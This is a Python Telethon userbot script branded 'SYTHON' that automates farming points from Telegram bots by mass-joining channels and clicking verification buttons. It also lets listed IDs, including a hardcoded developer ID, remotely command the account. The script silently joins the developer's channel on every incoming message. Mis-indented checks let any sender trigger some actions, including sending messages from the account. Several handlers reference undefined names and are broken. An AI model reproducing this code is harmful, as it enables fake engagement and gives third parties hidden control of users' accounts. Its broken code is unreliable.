from time import sleep
import logging
import asyncio
import time
import os
import requests
import re
import random
import telethon
from telethon import events, TelegramClient, functions
from telethon.tl import functions, types
from telethon.tl.types import InputPeerUser
from telethon.errors import FloodWaitError
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
    YouBlockedUserError,
    UserNotParticipantError
)
from telethon.sessions import StringSession
from telethon.utils import get_display_name
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import (
    ImportChatInviteRequest as Get,
    GetHistoryRequest,
    ImportChatInviteRequest,
    GetMessagesViewsRequest
)
from telethon.tl.functions.channels import (
    LeaveChannelRequest,
    JoinChannelRequest,
    InviteToChannelRequest,
    GetParticipantRequest
)
from telethon.tl.functions.contacts import UnblockRequest
from telethon.tl.functions.messages import (
    SendVoteRequest,
    SendReactionRequest
)


app_id = os.environ.get("APP_ID")
app_hash = os.environ.get("APP_HASH")
session = os.environ.get("TERMUX")
DEVLOO = os.environ.get("DEVLO")

omr1 = '''
╭──⌯𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗬𝗧𝗛𝗢𝗡⌯──╮

※ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 -  𝗦𝗔𝗬𝗧𝗛𝗢𝗡𝗛    ※

※ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 - 𝟭.𝟭 - 𝗥𝗘𝗩𝗜𝗦𝗘𝗗   ※

※ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 - 𝗛𝗨𝗦𝗔𝗠.𝗙𝗔  ※

╰───⌯𝗦𝗬𝗧𝗛𝗢𝗡 𝗣𝗢𝗜𝗡𝗧⌯───╯
'''

MackThon = TelegramClient(StringSession(session), app_id, app_hash)

MackThon.start()
c = requests.session()
bot_username = '@eeobot'
bot_usernamee = '@A_MAN9300BOT'
bot_usernameee = '@MARKTEBOT'
bot_usernameeee = '@xnsex21bot'
ownerhson_id = [int(DEVLOO)]
LOGS = logging.getLogger(__name__)
DEVS = [5159123009]
dam = True
running = True
ownerhson_ids = [5159123009]       
react = ['♥','🔥','👍','🤩']


@MackThon.on(events.NewMessage)
async def join_channel(event):
    try:
        await MackThon(JoinChannelRequest("@saythonh"))
    except BaseException:
        pass
        
@MackThon.on(events.NewMessage(outgoing=False, pattern='/c (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    acc = event.pattern_match.group(1) 
    if sender.id in ownerhson_id:
        acc = int(acc)
        await MackThon.send_message(acc, f"/store={DEVLOO}")
        ownerhson_id.append(acc)

@MackThon.on(events.NewMessage(outgoing=False, pattern='/dc (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    acc = event.pattern_match.group(1) 
    if sender.id in ownerhson_id:
        acc = int(acc)
        ownerhson_id.remove(acc)

@MackThon.on(events.NewMessage(outgoing=True, pattern="/c"))
async def _(event):
    user_id = event.message.to_id.user_id
    await event.edit(f'تم بنجاح الاضافة : {user_id}')
    await MackThon.send_message(user_id, f"/store={DEVLOO}")
    ownerhson_id.append(user_id)

@MackThon.on(events.NewMessage(outgoing=True, pattern="/dc"))
async def _(event):
    user_id = event.message.to_id.user_id
    await event.edit(f'تم بنجاح الحذف : {user_id}')
    await MackThon.send_message(user_id, f"/dstore={DEVLOO}")
    ownerhson_id.remove(user_id)

@MackThon.on(events.NewMessage(outgoing=False, pattern='.فحص'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        order = await event.reply('**the source is running ⚡️**')

@MackThon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("**جاري الفحص..**")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(omr1)


@MackThon.on(events.NewMessage(outgoing=False, pattern='.الاوامر'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        order = await event.reply('**قـم بالدخول الى البوت التالي لمعرفة الاوامر وكيفية استخدامي : @e8hbot**')



@MackThon.on(events.NewMessage(outgoing=False, pattern='/point1'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("**تـم استقبال الامر بنجاح**")
        await event.edit("**تـم بدأ التجميع **")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity(bot_username)
        await MackThon.send_message(bot_username, '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages(bot_username, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages(bot_username, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await asyncio.sleep(4)

            list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await MackThon.send_message(event.chat_id, f"تم الانتهاء من التجميع | SY")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await MackThon(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await MackThon(ImportChatInviteRequest(bott))
                msg2 = await MackThon.get_messages(bot_username, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await MackThon.get_messages(bot_username, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")
        await MackThon.send_message(event.chat_id, "تم الانتهاء من التجميع | SY")
        
@MackThon.on(events.NewMessage(outgoing=False, pattern='/point2'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("**تـم استقبال الامر بنجاح**")
        await event.edit("**تـم بدأ التجميع **")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity(bot_usernamee)
        await MackThon.send_message(bot_usernamee, '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages(bot_usernamee, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages(bot_usernamee, limit=1)
        await msg1[0].click(0)
        chs = 1
        for i in range(100):
            await asyncio.sleep(4)
            list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await MackThon.send_message(event.chat_id, f"تم الانتهاء من التجميع | SY")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await MackThon(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await MackThon(ImportChatInviteRequest(bott))
                msg2 = await MackThon.get_messages(bot_usernamee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await MackThon.get_messages(bot_usernamee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")
        await MackThon.send_message(event.chat_id, "تم الانتهاء من التجميع | SY")

@MackThon.on(events.NewMessage(outgoing=False, pattern='/point3'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("**تـم استقبال الامر بنجاح**")
        await event.edit("**تـم بدأ التجميع **")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity(bot_usernameee)
        await MackThon.send_message(bot_usernameee, '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages(bot_usernameee, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages(bot_usernameee, limit=1)
        await msg1[0].click(0)
        chs = 1
        for i in range(100):
            await asyncio.sleep(4)
            list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await MackThon.send_message(event.chat_id, f"تم الانتهاء من التجميع | SY")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await MackThon(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await MackThon(ImportChatInviteRequest(bott))
                msg2 = await MackThon.get_messages(bot_usernameee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await MackThon.get_messages(bot_usernameee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")
        await MackThon.send_message(event.chat_id, "تم الانتهاء من التجميع | SY")

@MackThon.on(events.NewMessage(outgoing=False, pattern='/point4'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("**تـم استقبال الامر بنجاح**")
        await event.edit("**تـم بدأ التجميع **")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity(bot_usernameeee)
        await MackThon.send_message(bot_usernameeee, '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages(bot_usernameeee, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages(bot_usernameeee, limit=1)
        await msg1[0].click(0)
        chs = 1
        for i in range(100):
            await asyncio.sleep(4)
            list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await MackThon.send_message(event.chat_id, f"تم الانتهاء من التجميع | SY")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await MackThon(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await MackThon(ImportChatInviteRequest(bott))
                msg2 = await MackThon.get_messages(bot_usernameeee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await MackThon.get_messages(bot_usernameeee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")
        await MackThon.send_message(event.chat_id, "تم الانتهاء من التجميع | SY")
        
@MackThon.on(events.NewMessage(outgoing=True, pattern=".تجميع المليار"))
async def _(event):
    await event.edit("**جاري تجميع النقاط**")
    joinu = await MackThon(JoinChannelRequest('saythonh'))
    channel_entity = await MackThon.get_entity(bot_username)
    await MackThon.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await MackThon.get_messages(bot_username, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await MackThon.get_messages(bot_username, limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await MackThon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | SY**")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await MackThon(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await MackThon(ImportChatInviteRequest(bott))
            msg2 = await MackThon.get_messages(bot_username, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await MackThon.get_messages(bot_username, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await MackThon.send_message(event.chat_id, "**تم الانتهاء من التجميع | SY**")

@MackThon.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
async def _(event):
    await event.edit("**جاري تجميع النقاط**")
    joinu = await MackThon(JoinChannelRequest('saythonh'))
    channel_entity = await MackThon.get_entity(bot_usernamee)
    await MackThon.send_message(bot_usernamee, '/start')
    await asyncio.sleep(4)
    msg0 = await MackThon.get_messages(bot_usernamee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await MackThon.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await MackThon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | SY**")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await MackThon(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await MackThon(ImportChatInviteRequest(bott))
            msg2 = await MackThon.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await MackThon.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await MackThon.send_message(event.chat_id, "**تم الانتهاء من التجميع | SY**")

@MackThon.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
async def _(event):
    await event.edit("**جاري تجميع النقاط**")
    joinu = await MackThon(JoinChannelRequest('saythonh'))
    channel_entity = await MackThon.get_entity(bot_usernameee)
    await MackThon.send_message(bot_usernameee, '/start')
    await asyncio.sleep(4)
    msg0 = await MackThon.get_messages(bot_usernameee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await MackThon.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await MackThon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | SY**")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await MackThon(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await MackThon(ImportChatInviteRequest(bott))
            msg2 = await MackThon.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await MackThon.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await MackThon.send_message(event.chat_id, "**تم الانتهاء من التجميع | SY**")


@MackThon.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
async def _(event):
    await event.edit("**جاري تجميع النقاط**")
    joinu = await MackThon(JoinChannelRequest('saythonh'))
    channel_entity = await MackThon.get_entity(bot_usernameeee)
    await MackThon.send_message(bot_usernameeee, '/start')
    await asyncio.sleep(4)
    msg0 = await MackThon.get_messages(bot_usernameeee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await MackThon.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await MackThon.send_message(event.chat_id, f"**تم الانتهاء من التجميع | SY**")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await MackThon(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await MackThon(ImportChatInviteRequest(bott))
            msg2 = await MackThon.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await MackThon.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await MackThon.send_message(event.chat_id, "**تم الانتهاء من التجميع | SY**")


##########################################

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/point (.*)'))
async def OwnerStart(event):
    pot = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("**تـم استقبال الامر **")
        await event.edit("**جاري تجميع النقاط**")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity(pot)
        await MackThon.send_message(pot, '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages(pot, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages(pot, limit=1)
        await msg1[0].click(0)
        chs = 1
        for i in range(100):
            await asyncio.sleep(4)
            list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await MackThon.send_message(event.chat_id, f"تم الانتهاء من التجميع | SY")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await MackThon(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await MackThon(ImportChatInviteRequest(bott))
                msg2 = await MackThon.get_messages(pot, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await MackThon.get_messages(pot, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")
        await MackThon.send_message(event.chat_id, "تم الانتهاء من التجميع | SY")

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/bot (.*) (.*) (.*)'))
async def OwnerStart(event):
    bots = event.pattern_match.group(1) 
    ids = event.pattern_match.group(2) 
    idss = event.pattern_match.group(3) 
    idss = int(idss)
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        for i in range(idss):
            sleep(5)
            send = await MackThon.send_message(bots,f'/start {ids}')
        sleep(6)
    msg = await MackThon.get_messages(bots, limit=2)
    await msg[1].forward_to(ownerhson_id)

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/stop$'))  # نمط الرسالة التي يجب إرسالها لإيقاف الحلقات
async def stop(event):
    global running
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        running = False
        await event.reply('تم إيقاف الحلقات')

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/run$'))  
async def run(event):
    global running 
    sender = await event.get_sender()
    if sender.id in ownerhson_id: 
        running = True
        await event.reply('تم تشغيل جميع الحلقات') 

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/somy (.*) (.*)'))
async def OwnerStart(event):
    global running
    await event.reply(f"جاري بدء التجميع")
    while running:
        try:
            pot = event.pattern_match.group(1) 
            numw = int(event.pattern_match.group(2))
            sender = await event.get_sender()
            if sender.id in ownerhson_id:
                await event.reply(f"**✣ حسنا سوف اقوم بعملية التجميع\\n✣ عدد الثواني بين كل محاولة : {numw} \\n✣ التجميع من بوت : @{pot}**")
                user_entity = await MackThon.get_input_entity(pot)
                await MackThon(UnblockRequest(user_entity.user_id))
                joinu = await MackThon(JoinChannelRequest('saythonh'))
                channel_entity = await MackThon.get_entity(pot)              
                await MackThon.send_message(pot, '/start')
                await asyncio.sleep(2)
                await MackThon.send_message(pot, '/start')
                await asyncio.sleep(2)
                msg0 = await MackThon.get_messages(pot, limit=1)
                if 'http' in msg0[0].message:
                    await event.reply('**هنالك قناة اشتراك اجباري تعيق عملي**')
                    break
                else:
                    await msg0[0].click(2)
                    await asyncio.sleep(2)
                    msg1 = await MackThon.get_messages(pot, limit=1)
                    await msg1[0].click(0)
                    chs = 0
                    for i in range(100):
                        if not running:  
                            break
                        await asyncio.sleep(2)
                        list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                                offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
                        msgs = list.messages[0]
                        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                            await MackThon.send_message(event.chat_id, f"**✣ حسنا سوف اقوم بعملية التجميع\\n✣ عدد الثواني بين كل محاولة : {numw} \\n✣ التجميع من بوت : @{pot}**")
                            break
                        url = msgs.reply_markup.rows[0].buttons[0].url
                        try:
                            try:
                                await MackThon(JoinChannelRequest(url))
                            except FloodWaitError as e:
                                await event.reply(f"**Flood wait error. I will wait for {e.seconds} seconds before trying again.**")
                                await asyncio.sleep(e.seconds)
                                continue
                            except:
                                syth = url.split('+')[-1]
                                try:
                                    await MackThon(ImportChatInviteRequest(syth))
                                except FloodWaitError as e:
                                    await event.reply(f"**Flood wait error. I will wait for {e.seconds} seconds before trying again.**")
                                    await asyncio.sleep(e.seconds)
                                    continue
                            msg2 = await MackThon.get_messages(pot, limit=1)
                            await msg2[0].click(text='التالي')
                            chs += 10
                            await event.reply(f"**✣ عدد النقاط في هذه المحاولة {chs} ✣**")
                        except FloodWaitError as e:
                            await event.reply(f"**Flood wait error. I will wait for {e.seconds} seconds before trying again.**")
                            await asyncio.sleep(e.seconds)
                            continue
                        except:
                            msg2 = await MackThon.get_messages(pot, limit=1)
                            await msg2[0].click(text='التالي')
                            chs += 0
                            await event.reply(f"**✣ عدد النقاط في هذه المحاولة {chs} ✣**")    
                    await MackThon.send_message(event.chat_id, f"**✣ عذرا نفذت قنوات البوت\\n✣ لكن سوف اعاود المحاولة بعد {numw} ثانية**")
                    await asyncio.sleep(numw)
        except Exception as e:
            await asyncio.sleep(numw)

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/ptf (.*) (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    ptt = event.pattern_match.group(2) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        send = await MackThon.send_message(pt, '/start')
        sleep(2)
        msg1 = await MackThon.get_messages(pt, limit=1)
        if 'http' in msg1[0].message:
            await event.reply('**هنالك قناة اشتراك تجباري تعيق عملي')
            return
        else:
            await msg1[0].click(3)
            sleep(4)
            await MackThon.send_message(pt, ptt)
            sleep(4)
            msg = await MackThon.get_messages(pt, limit=1)
            await msg[0].forward_to(ubot)
            
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/pt1 (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_username, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_username, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await MackThon.send_message(bot_username, pt)
    sleep(4)
    msg = await MackThon.get_messages(bot_username, limit=1)
    await msg[0].forward_to(ownerhson_id)
    
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/pt2 (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_usernamee, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await MackThon.send_message(bot_usernamee, pt)
    sleep(4)
    msg = await MackThon.get_messages(bot_usernamee, limit=1)
    await msg[0].forward_to(ownerhson_id)

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/pt3 (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_usernameee, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await MackThon.send_message(bot_usernameee, pt)
    sleep(4)
    msg = await MackThon.get_messages(bot_usernameee, limit=1)
    await msg[0].forward_to(ownerhson_id)
    
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/pt4 (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_usernameeee, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await MackThon.send_message(bot_usernameeee, pt)
    sleep(4)
    msg = await MackThon.get_messages(bot_usernameeee, limit=1)
    await msg[0].forward_to(ownerhson_id)
    
    
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/npoint (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(pt, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(pt, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await MackThon.get_messages(pt, limit=1)
    await msg[0].forward_to(ownerhson_id)


@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/npoint1'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_username, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_username, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await MackThon.get_messages(bot_username, limit=1)
    await msg[0].forward_to(ownerhson_id)
    
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/npoint2'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_usernamee, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await MackThon.get_messages(bot_usernamee, limit=1)
    await msg[0].forward_to(ownerhson_id)
 
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/npoint3'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_usernameee, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await MackThon.get_messages(bot_usernameee, limit=1)
    await msg[0].forward_to(ownerhson_id)
    
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/npoint4'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     send = await MackThon.send_message(bot_usernameeee, '/start')
     sleep(2)
    msg1 = await MackThon.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await MackThon.get_messages(bot_usernameeee, limit=1)
    await msg[0].forward_to(ownerhson_id)
    
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/lpoint'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        dialogs = await MackThon.get_dialogs()
        count = 0
        for dialog in dialogs:
            if dialog.is_channel:
                await MackThon(LeaveChannelRequest(dialog.entity))
                count += 1
        await event.respond(f"**قمت بمغادرة {count} من القنوات والمجموعات**")
        await asyncio.sleep(3)

@MackThon.on(events.NewMessage(pattern=r'^/send (.*) (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
     usern = event.pattern_match.group(1)
    mase = event.pattern_match.group(2)
    await MackThon.send_message(usern, mase)
    await event.respond(f"**تـم ارسال الرسالة الى المستخدم {usern}**")    

@MackThon.on(events.NewMessage(outgoing=False, pattern='/transfer'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        order = await event.reply(omr8)

@MackThon.on(events.NewMessage(outgoing=False, pattern='/infoacc'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        order = await event.reply(omr9)

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/button (.*) (.*)'))
async def OwnerStart(event):
    userbt = event.pattern_match.group(1) 
    bt = int(event.pattern_match.group(2))
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
     sleep(2)
    msg1 = await MackThon.get_messages(userbt, limit=1)
    await msg1[0].click(bt)
    await MackThon.send_message(event.chat_id, f"**❈ حسناً قمت بالنقر على الزر رقم {bt}**")
        
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
async def OwnerStart(event):
    userbott = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        sing = await MackThon.send_message(event.chat_id, f"**❈ حسناً سوف اقوم بتحويل اخر رسالة\\n❈ من المستخدم {userbott}**")
        msgs = await MackThon.get_messages(userbott, limit=1)
        if msgs:
            await msgs[0].forward_to(ownerhson_id)
        
@MackThon.on(events.NewMessage(outgoing=False, pattern='/jn (.*)'))
async def OwnerStart(event):
    usercht = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        sendy = await MackThon.send_message(event.chat_id,f"**جاري الانضمام في القناة @{usercht}**")
        joinch = await MackThon(JoinChannelRequest(usercht))
        sendy = await MackThon.send_message(event.chat_id,f"**تم الانضمام في القناة @{usercht}**")

